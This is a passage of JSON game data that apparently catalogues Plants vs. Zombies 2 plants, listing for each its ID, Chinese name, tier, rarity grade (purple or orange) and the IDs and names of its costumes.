{"31110164":"猕猴桃齐天大圣装扮"}]},{"111020":"火柴花拳手","jieshu":"4","pinzhi":"zise","zhuangban":[{"111220":"火柴花拳手伴生装扮"},
{"31110201":"火柴花拳手斗篷装扮"}]},{"111024":"逆时草","jieshu":"2","pinzhi":"zise","zhuangban":[{"111224":"逆时草伴生装扮"}]},{"111034":"缩小紫罗兰","jieshu":"4","pinzhi":"zise","zhuangban":[{"111234":"缩小紫罗兰伴生装扮"}]},{"111039":"原始土豆地雷","jieshu":"4","pinzhi":"zise","zhuangban":[{"111239":"原始土豆地雷伴生装扮"},
{"31110391":"原始土豆地雷虎纹装扮"}]},{"111040":"龙吼草","jieshu":"4","pinzhi":"zise","zhuangban":[{"111240":"龙吼草伴生装扮"},
{"31110401":"龙吼草联动装扮"}]},{"111054":"夜影龙葵","jieshu":"3","pinzhi":"zise","zhuangban":[{"111254":"夜影龙葵伴生装扮"}]},{"111058":"暗樱草","jieshu":"4","pinzhi":"zise","zhuangban":[{"111258":"暗樱草伴生装扮"}]},{"111062":"槲寄冰仙子","jieshu":"4","pinzhi":"zise","zhuangban":[{"111262":"槲寄冰仙子伴生装扮"},
{"31110621":"槲寄冰仙子围巾装扮"},
{"31110622":"槲寄冰仙子周年装扮"},
{"31110623":"槲寄冰仙子全身装扮"}]},{"111063":"野兽猕猴桃","jieshu":"4","pinzhi":"zise","zhuangban":[{"111263":"野兽猕猴桃伴生装扮"},
{"31110631":"野兽猕猴桃头饰"},
{"31110632":"野兽猕猴桃猪八戒装扮"}]},{"111066":"莲藕射手","jieshu":"4","pinzhi":"zise","zhuangban":[{"111266":"莲藕射手伴生装扮"}]},{"111069":"吹风荚兰","jieshu":"4","pinzhi":"zise","zhuangban":[{"111269":"吹风荚兰伴生装扮"},
{"31110691":"吹风荚兰儿童高筒帽装扮"}]},{"111073":"热辣海枣","jieshu":"4","pinzhi":"zise","zhuangban":[{"111273":"热辣海枣伴生装扮"}]},{"111076":"芭蕉舞蹈家","jieshu":"4","pinzhi":"zise","zhuangban":[{"111276":"芭蕉舞蹈家伴生装扮"}]},{"111078":"水仙花射手","jieshu":"4","pinzhi":"zise","zhuangban":[{"111278":"水仙花射手伴生装扮"}]},{"111084":"暗影豌豆","jieshu":"4","pinzhi":"zise","zhuangban":[{"111284":"暗影豌豆伴生装扮"},
{"31110841":"暗影豌豆女巫帽装扮"},
{"31110842":"暗影豌豆草帽装扮"}]},{"111086":"水晶兰","jieshu":"4","pinzhi":"zise","zhuangban":[{"111286":"水晶兰伴生装扮"},
{"31110861":"水晶兰圣诞装扮"},
{"31110862":"水晶兰唐僧装扮"}]},{"111087":"豌豆迫击炮","jieshu":"4","pinzhi":"zise","zhuangban":[{"111287":"豌豆迫击炮伴生装扮"},
{"31110871":"豌豆迫击炮周年庆装扮"},
{"31110872":"豌豆迫击炮金秋装扮"}]},{"111089":"芦荟医师","jieshu":"4","pinzhi":"zise","zhuangban":[{"111289":"芦荟医师伴生装扮"},
{"31110891":"芦荟医师战旗套装扮"},
{"31110892":"芦荟医师周年装扮"},
{"31110893":"芦荟医师全身装扮"},
{"31110894":"芦荟医师财运亨通装扮"},
{"31110895":"芦荟医师财运亨通幻彩装扮"}]},{"200001":"小黄梨","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000010":"小黄梨伴生装扮"},
{"32000011":"小黄梨兔年装扮"},
{"32000012":"小黄梨禅杖装扮"}]},{"200007":"杜英投手","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000070":"杜英投手伴生装扮"},
{"32000071":"杜英投手六一装扮"},
{"32000072":"杜英投手周年装扮"},
{"32000073":"杜英投手永劫无间装扮"}]},{"200011":"铜钱草鼓手","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000110":"铜钱草鼓手伴生装扮"},
{"32000111":"铜钱草鼓手兔年装扮"},
{"32000112":"铜钱草鼓手领带装扮"}]},{"200013":"潜行开口箭","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000130":"潜行开口箭伴生装扮"},
{"32000131":"潜行开口箭围巾装扮"}]},{"200014":"暗影荚兰","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000140":"暗影荚兰伴生装扮"}]},{"200027":"爆炸桔梗","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000270":"爆炸桔梗伴生装扮"},
{"32000271":"爆炸桔梗圣诞节装扮"}]},{"200039":"气流水仙花","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000390":"气流水仙花伴生装扮"},
{"32000391":"气流水仙花成长装扮"},
{"32000392":"气流水仙花灯笼装扮"}]},{"200049":"刺果流星锤","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000490":"刺果流星锤伴生装扮"}]},{"200050":"黄油毛艮","jieshu":"4","pinzhi":"zise","zhuangban":[{"32000500":"黄油毛艮伴生装扮"}]},{"200135":"海带守卫","jieshu":"3","pinzhi":"zise","zhuangban":[{"32001350":"海带守卫伴生装扮"},
{"32001351":"海带守卫金链子腕表装扮"}]},{"200142":"盒子草礼炮","jieshu":"4","pinzhi":"zise","zhuangban":[{"32001420":"盒子草礼炮伴生装扮"},
{"32001421":"盒子草礼炮太阳伞装扮"}]},{"200157":"胆小菇","jieshu":"4","pinzhi":"zise","zhuangban":[{"32001570":"胆小菇伴生装扮"},
{"32001571":"胆小菇青帽子装扮"}]},{"1012":"火龙草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1212":"火龙草伴生装扮"},
{"30010121":"火龙草钢盔"},
{"30010122":"火龙草礼帽装扮"},
{"30010123":"火龙草兔耳帽装扮"},
{"30010124":"火龙草龙年装扮"},
{"30010125":"火龙草海盗帽装扮"}]},{"1031":"冰西瓜投手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1231":"冰西瓜投手伴生装扮"},
{"30010311":"冰西瓜绒帽装扮"},
{"30010313":"冰西瓜夹子风扇"}]},{"1043":"充能柚子","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1243":"充能柚子伴生装扮"},
{"30010431":"充能柚子冰杯帽装扮"}]},{"1045":"瓷砖萝卜","jieshu":"0","pinzhi":"chengse","zhuangban":[{"1245":"瓷砖萝卜伴生装扮"},
{"30010451":"瓷砖萝卜超级装扮"}]},{"1052":"阳光菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1252":"阳光菇伴生装扮"},
{"30010521":"阳光菇国风装扮"},
{"30010522":"阳光菇兔耳装扮"}]},{"1058":"寒冰菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1258":"寒冰菇伴生装扮"},
{"30010581":"寒冰菇金秋装扮"}]},{"1065":"保龄泡泡","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1265":"保龄泡泡伴生装扮"},
{"30010651":"保龄泡泡红鼻子装扮"}]},{"1067":"香蕉火箭炮","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1267":"香蕉火箭炮伴生装扮"}]},{"1071":"强酸柠檬","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1271":"强酸柠檬伴生装扮"},
{"30010711":"强酸柠檬圣诞装扮"}]},{"1097":"魔术菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"1297":"魔术菇伴生装扮"}]},{"111019":"天使星星果","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111219":"天使星星果伴生装扮"},
{"31110191":"天使星星果眼镜装扮"},
{"31110192":"天使星星果全身装扮"},
{"31110193":"天使星星果超级装扮"}]},{"111021":"火焰花女王","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111221":"火焰花女王伴生装扮"},
{"31110211":"火焰花女王芭蕉扇装扮"}]},{"111022":"机枪射手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111222":"机枪射手伴生装扮"},
{"31110221":"机枪豌豆联动装扮"},
{"31110222":"机枪豌豆限定装扮"},
{"31110223":"机枪豌豆耳机装扮"},
{"31110224":"机枪豌豆超级装扮"}]},{"111029":"仙人掌","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111229":"仙人掌伴生装扮"},
{"31110291":"仙人掌派对助力装扮"},
{"31110292":"仙人掌超级装扮"},
{"31110293":"仙人掌敦煌装扮"}]},{"111030":"猫尾草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111230":"猫尾草伴生装扮"},
{"31110301":"猫尾草小型快递纸箱装扮"},
{"31110302":"猫尾草蛋糕头装扮"},
{"31110303":"猫尾草宠物装扮"}]},{"111031":"喇叭花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111231":"喇叭花伴生装扮"}]},{"111032":"爆裂葡萄","jieshu":"2","pinzhi":"chengse","zhuangban":[{"111232":"爆裂葡萄伴生装扮"},
{"31110321":"爆裂葡萄彩气球装扮"},
{"31110322":"爆裂葡萄敦煌装扮"}]},{"111033":"冰龙草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111233":"冰龙草伴生装扮"},
{"31110331":"冰龙草冰激凌装扮"},
{"31110332":"冰龙草龙年装扮"},
{"31110333":"冰龙草全身装扮"}]},{"111042":"原始大王花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111242":"原始大王花伴生装扮"}]},{"111043":"蔗师傅","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111243":"蔗师傅伴生装扮"},
{"31110431":"蔗师傅联动装扮"}]},{"111044":"玉米加农炮","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111244":"玉米加农炮伴生装扮"},
{"31110441":"玉米加农炮圣诞帽装扮"},
{"31110442":"玉米加农炮超级装扮"}]},{"111045":"苹果迫击炮","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111245":"苹果迫击炮伴生装扮"},
{"31110451":"苹果迫击炮虎年装扮"},
{"31110452":"苹果迫击炮成长装扮"},
{"31110453":"苹果迫击炮派对助力装扮"},
{"31110454":"苹果迫击炮恶魔超级装扮"}]},{"111046":"金缕梅女巫","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111246":"金缕梅女巫伴生装扮"},
{"31110461":"金缕梅女巫睡帽装扮"}]},{"111047":"逃脱树根","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111247":"逃脱树根伴生装扮"},
{"31110471":"逃脱树根警长帽装扮"},
{"31110472":"逃脱树根全息眼镜装扮"}]},{"111048":"电流醋栗","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111248":"电流醋栗伴生装扮"},
{"31110481":"电流醋栗节能灯装扮"}]},{"111049":"白瓜相扑手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111249":"白瓜相扑手伴生装扮"}]},{"111050":"超能花菜","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111250":"超能花菜伴生装扮"},
{"31110251":"超能花菜敦煌装扮"}]},{"111055":"幽暮投手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111255":"幽暮投手伴生装扮"},
{"31110551":"幽暮投手鸭舌帽装扮"}]},{"111060":"炙热山葵","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111260":"炙热山葵伴生装扮"}]},{"111061":"防风草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111261":"防风草伴生装扮"},
{"31110611":"防风草蟹壳帽装扮"}]},{"111067":"芦黎药师","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111267":"芦黎药师伴生装扮"},
{"31110671":"芦黎药师成长装扮"},
{"31110672":"芦黎药师超级装扮"}]},{"111070":"桑葚爆破手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111270":"桑葚爆破手伴生装扮"},
{"31110701":"桑葚爆破手周年庆假面装扮"},
{"31110702":"桑葚爆破手成长海盗眼罩"},
{"31110703":"桑葚爆破手限时召唤海盗装扮"},
{"31110704":"桑葚爆破手超级装扮"}]},{"111071":"电能豌豆","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111271":"电能豌豆伴生装扮"},
{"31110711":"电能豌豆成长装扮"},
{"31110712":"电能豌豆耳机装扮"}]},{"111072":"寒冰醋栗","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111272":"寒冰醋栗伴生装扮"},
{"31110721":"寒冰醋栗护目镜装扮"}]},{"111074":"郁金香号手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111274":"郁金香号手伴生装扮"}]},{"111075":"茄子忍者","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111275":"茄子忍者伴生装扮"},
{"31110751":"茄子忍者圣诞装扮"},
{"31110752":"茄子忍者成长装扮"},
{"31110753":"茄子忍者零装扮"}]},{"111079":"双枪松果","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111279":"双枪松果伴生装扮"},
{"31110791":"双枪松果兔年装扮"}]},{"111081":"警爆磁菇","jieshu":"2","pinzhi":"chengse","zhuangban":[{"111281":"警爆磁菇伴生装扮"}]},{"111082":"冬青骑士","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111282":"冬青骑士伴生装扮"},
{"31110821":"冬青骑士福字装扮"}]},{"111085":"食人花豌豆","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111285":"食人花豌豆伴生装扮"},
{"31110851":"食人花豌豆成长装扮"},
{"31110852":"食人花豌豆围巾装扮"}]},{"111088":"雷龙草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111288":"雷龙草伴生装扮"},
{"31110881":"雷龙草兔年装扮"},
{"31110882":"雷龙草龙年装扮"}]},{"111090":"熊果臼炮","jieshu":"4","pinzhi":"chengse","zhuangban":[{"111290":"熊果臼炮伴生装扮"},
{"31110901":"熊果臼炮周年庆装扮"},
{"31110902":"熊果臼炮成长装扮"},
{"31110903":"熊果臼炮沙僧装扮"}]},{"200000":"电力绿茶","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000000":"电力绿茶伴生装扮"}]},{"200002":"宝石商石榴","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000020":"宝石商石榴伴生装扮"}]},{"200004":"白露花战机","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000040":"白露花战机伴生装扮"}]},{"200005":"爆炸草莓","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000050":"爆炸草莓伴生装扮"}]},{"200006":"毒液豌豆射手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000060":"毒液豌豆射手伴生装扮"},
{"32000061":"毒液豌豆射手巫医装扮"}]},{"200008":"飞镖洋蓟","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000080":"飞镖洋蓟伴生装扮"}]},{"200009":"荸荠兄弟","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000090":"荸荠兄弟伴生装扮"},
{"32000091":"荸荠兄弟虎年装扮"},
{"32000092":"荸荠兄弟成长装扮"},
{"32000093":"荸荠兄弟金银大王装扮"}]},{"200010":"尖刺秋葵","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000100":"尖刺秋葵伴生装扮"},
{"32000101":"尖刺秋葵娃娃假发装扮"},
{"32000102":"尖刺秋葵大冬被装扮"}]},{"200012":"终极番茄","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000120":"终极番茄伴生装扮"}]},{"200015":"凤梨链刃","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000150":"凤梨链刃伴生装扮"}]},{"200019":"厨师杓兰","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000190":"厨师杓兰伴生装扮"},
{"32000191":"厨师杓兰六一装扮"},
{"32000192":"厨师杓兰成长装扮"}]},{"200020":"粘液桉果","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000200":"粘液桉果伴生装扮"}]},{"200021":"橄榄坑","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000210":"橄榄坑伴生装扮"},
{"32000211":"橄榄坑成长装扮"},
{"32000212":"橄榄坑搞怪眼镜装扮"}]},{"200022":"刺眼花艺伎","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000220":"刺眼花艺伎伴生装扮"}]},{"200023":"黏弹糯米","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000230":"黏弹糯米伴生装扮"}]},{"200024":"地星发射井","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000240":"地星发射井伴生装扮"},
{"32000241":"地星发射井金秋装扮"}]},{"200025":"奶油生菜","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000250":"奶油生菜伴生装扮"},
{"32000251":"奶油生菜宠物装扮"}]},{"200026":"眩晕雏菊","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000260":"眩晕雏菊伴生装扮"},
{"32000261":"眩晕雏菊眩晕眼镜装扮"}]},{"200028":"庆典汽水椰","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000280":"庆典汽水椰伴生装扮"}]},{"200029":"钩爪嘉兰","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000290":"钩爪嘉兰伴生装扮"}]},{"200031":"凤仙花射手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000310":"凤仙花射手伴生装扮"}]},{"200032":"火鸡投手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000320":"火鸡投手伴生装扮"},
{"32000321":"火鸡投手圣诞节装扮"},
{"32000322":"火鸡投手奶嘴装扮"}]},{"200033":"铁锤兰","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000330":"铁锤兰伴生装扮"}]},{"200034":"聚能山竹","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000340":"聚能山竹伴生装扮"},
{"32000341":"聚能山竹发卡装扮"},
{"32000342":"聚能山竹飞车装扮"},
{"32000343":"聚能山竹全身装扮"},
{"32000344":"聚能山竹超级装扮"}]},{"200035":"鱼钩草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000350":"鱼钩草伴生装扮"}]},{"200037":"烈焰火蕨","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000370":"烈焰火蕨伴生装扮"},
{"32000371":"烈焰火蕨舞会假面装扮"},
{"32000372":"烈焰火蕨哪吒全身装扮"}]},{"200038":"虎头菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000380":"虎头菇伴生装扮"},
{"32000381":"虎头菇成长装扮"},
{"32000382":"虎头菇永劫无间联动装扮"}]},{"200041":"地锯草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000410":"地锯草伴生装扮"},
{"32000411":"地锯草耳机装扮"}]},{"200044":"树灵护卫","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000440":"树灵护卫伴生装扮"}]},{"200045":"疯帽菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000450":"疯帽菇伴生装扮"}]},{"200046":"魔法番红花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000460":"魔法番红花伴生装扮"}]},{"200047":"公主弹簧草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000470":"公主弹簧草伴生装扮"}]},{"200048":"宊击竹兵","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000480":"宊击竹兵伴生装扮"}]},{"200051":"激光皇冠花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000510":"激光皇冠花伴生装扮"},
{"32000511":"激光皇冠花圣诞大胡子装扮"},
{"32000512":"激光皇冠花成长装扮"},
{"32000513":"激光皇冠花女王装扮"}]},{"200052":"腐尸豆荚","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000520":"腐尸豆荚伴生装扮"}]},{"200053":"扇贝兰法师","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000530":"扇贝兰法师伴生装扮"},
{"32000531":"扇贝兰成长装扮"},
{"32000532":"扇贝兰派对助力装扮"}]},{"200054":"杰克南瓜灯","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000540":"杰克南瓜灯伴生装扮"}]},{"200055":"豌豆药剂师","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000550":"豌豆药剂师伴生装扮"}]},{"200056":"双生卯兔","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000560":"双生卯兔伴生装扮"},
{"32000561":"双生卯兔成长装扮"}]},{"200057":"长枪球兰","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000570":"长枪球兰伴生装扮"},
{"32000571":"长枪秋兰龙年装扮"},
{"32000572":"长枪秋兰红孩儿装扮"}]},{"200058":"牛蒡击球手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000580":"牛蒡击球手伴生装扮"},
{"32000581":"牛蒡击球手成长装扮"},
{"32000582":"牛蒡击球手全身装扮"},
{"32000583":"牛蒡击球手超级装扮"}]},{"200059":"吸血牛杆菌","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000590":"吸血牛杆菌伴生装扮"}]},{"200061":"鹳草击剑手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000610":"鹳草击剑手伴生装扮"},
{"32000611":"鹳草击剑手龙年装扮"}]},{"200062":"蓄电雪松果","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000620":"蓄电雪松果伴生装扮"},
{"32000621":"蓄电雪松果成长装扮"}]},{"200063":"电能藤蔓","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000630":"电能藤蔓伴生装扮"}]},{"200064":"蛇妖瓶子草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000640":"蛇妖瓶子草伴生装扮"},
{"32000641":"蛇妖瓶子草成长装扮"},
{"32000642":"蛇妖瓶子草墨镜装扮"}]},{"200065":"流星花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000650":"流星花伴生装扮"}]},{"200066":"曼德拉草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000660":"曼德拉草伴生装扮"},
{"32000661":"曼德拉草成长装扮"},
{"32000662":"曼德拉草派对助力装扮"}]},{"200067":"深渊海葵","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000670":"深渊海葵伴生装扮"},
{"32000671":"深渊海葵成长装扮"}]},{"200068":"深渊魔爪花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000680":"深渊魔爪花伴生装扮"},
{"32000681":"深渊魔爪花成长装扮"}]},{"200069":"粉丝心叶兰","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000690":"粉丝心叶兰伴生装扮"},
{"32000691":"粉丝心叶兰圣诞装扮"},
{"32000692":"粉丝心叶兰飞车装扮"}]},{"200070":"豌豆藤蔓","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000700":"豌豆藤蔓伴生装扮"}]},{"200071":"蜜蜂铃兰","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000710":"蜜蜂铃兰伴生装扮"},
{"32000711":"蜜蜂铃兰尖头帽装扮"}]},{"200072":"油菜花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000720":"油菜花伴生装扮"}]},{"200073":"剑叶龙血树","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000730":"剑叶龙血树伴生装扮"},
{"32000731":"剑叶龙血树成长装扮"},
{"32000732":"剑叶龙血树永劫无间联动装扮"},
{"32000733":"剑叶龙血树红衣服装扮"}]},{"200074":"斯巴达竹","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000740":"斯巴达竹伴生装扮"},
{"32000741":"斯巴达竹成长装扮"}]},{"200075":"闪耀藤蔓","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000750":"闪耀藤蔓伴生装扮"}]},{"200076":"阳光韭菜","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000760":"阳光韭菜伴生装扮"}]},{"200077":"暗夜菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000770":"暗夜菇伴生装扮"},
{"32000771":"暗夜菇成长装扮"},
{"32000772":"暗夜菇卷轴装扮"}]},{"200078":"柴堆藤蔓","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000780":"柴堆藤蔓伴生装扮"}]},{"200079":"贪吃龙草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000790":"贪吃龙草伴生装扮"},
{"32000791":"贪吃龙草成长装扮"},
{"32000792":"贪吃龙草超级装扮"},
{"32000793":"贪吃龙草龙王装扮"}]},{"200080":"兔极","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000800":"兔极伴生装扮"},
{"32000801":"兔极企鹅装扮"}]},{"200081":"植甲拼装者-炎星","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000810":"植甲拼装者-炎星伴生装扮"}]},{"200082":"蝎尾蕉机枪手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000820":"蝎尾蕉机枪手伴生装扮"},
{"32000821":"蝎尾蕉机枪手成长装扮"},
{"32000822":"蝎尾蕉机枪手饿哥装扮"}]},{"200083":"电鳗香蕉","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000830":"电鳗香蕉伴生装扮"},
{"32000831":"电鳗香蕉派对助力装扮"},
{"32000832":"电鳗香蕉超级装扮"}]},{"200084":"荆棘巫师","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000840":"荆棘巫师伴生装扮"},
{"32000841":"荆棘巫师成长装扮"}]},{"200085":"锯齿锦地罗","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000850":"锯齿锦地罗伴生装扮"},
{"32000851":"锯齿锦地罗成长装扮"}]},{"200086":"寄生仙钗","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000860":"寄生仙钗伴生装扮"},
{"32000861":"寄生仙钗成长装扮"}]},{"200088":"暴君火龙果","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000880":"暴君火龙果伴生装扮"},
{"32000881":"暴君火龙果成长装扮"}]},{"200089":"小暴君火龙果","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000890":"小暴君火龙果伴生装扮"}]},{"200090":"忧郁藤蔓","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000900":"忧郁藤蔓伴生装扮"}]},{"200091":"电击鹰爪花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000910":"电击鹰爪花伴生装扮"},
{"32000911":"电击鹰爪花飞车装扮"},
{"32000912":"电击鹰爪花电池头装扮"}]},{"200092":"留声曼陀罗","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000920":"留声曼陀罗伴生装扮"},
{"32000921":"留声曼陀罗金秋装扮"},
{"32000922":"留声曼陀罗成长装扮"},
{"32000923":"留声曼陀罗音响装扮"}]},{"200093":"疯狂炮仗花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000930":"疯狂炮仗花伴生装扮"}]},{"200094":"日月金银花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000940":"日月金银花伴生装扮"},
{"32000941":"日月金银花冬日装扮"}]},{"200095":"蛮族大黄","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000950":"蛮族大黄伴生装扮"},
{"32000951":"蛮族大黄成长装扮"}]},{"200096":"水生藤蔓","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000960":"水生藤蔓伴生装扮"}]},{"200097":"寒霜白毛丹","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000970":"寒霜白毛丹伴生装扮"}]},{"200098":"电击钩吻","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000980":"电击钩吻伴生装扮"},
{"32000981":"电击钩吻派对助力眼镜装扮"},
{"32000982":"电击钩吻成长装扮"},
{"32000983":"电击钩吻幻彩装扮前"},
{"32000984":"电击钩吻幻彩装扮后"}]},{"200099":"寒冰地刺","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32000990":"寒冰地刺伴生装扮"},
{"32000991":"寒冰地刺头饰装扮"},
{"32000992":"寒冰地刺围巾装扮"}]},{"200100":"珊瑚泡泡姬","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001000":"珊瑚泡泡姬伴生装扮"},
{"32001001":"珊瑚泡泡姬成长装扮"},
{"32001002":"珊瑚泡泡姬标签装扮"},
{"32001003":"珊瑚泡泡姬全身装扮"}]},{"200101":"百宝兜兰","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001010":"百宝兜兰伴生装扮"},
{"32001011":"百宝兜兰丞相帽子装扮"},
{"32001012":"百宝兜兰大胡子装扮"}]},{"200102":"女娲蛇尾草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001020":"女娲蛇尾草伴生装扮"},
{"32001021":"女娲蛇尾草全身装扮"},
{"32001022":"女娲蛇尾草头饰装扮"}]},{"200127":"枫影刺客","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001270":"枫影刺客伴生装扮"},
{"32001271":"枫影刺客双刀流装扮"},
{"32001272":"枫影刺客头箍装扮"},
{"32001273":"枫影刺客装逼眼镜装扮"}]},{"200128":"守卫菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001280":"守卫菇伴生装扮"},
{"32001281":"守卫菇全身装扮"},
{"32001282":"守卫菇圣诞树装扮"}]},{"200133":"伏僵塔黄","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001330":"伏僵塔黄伴生装扮"},
{"32001331":"伏僵塔黄全身装扮"},
{"32001332":"伏僵塔黄超级装扮"}]},{"200134":"超级机枪射手","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001340":"超级机枪射手伴生装扮"},
{"32001341":"超级机枪射手全身装扮"},
{"32001342":"超级机枪射手超级装扮"}]},{"200139":"海神草","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001390":"海神草伴生装扮"},
{"32001391":"海神草全身装扮"},
{"32001392":"海神草金丝眼镜装扮"}]},{"200140":"海豌豆","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001400":"海豌豆伴生装扮"},
{"32001401":"海豌豆兔耳帽装扮"},
{"32001402":"海豌豆鸭嘴兽全身装扮"}]},{"200143":"球果训练家","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001430":"球果训练家伴生装扮"},
{"32001431":"球果训练家全身装扮"},
{"32001432":"球果训练家绣球装扮"},
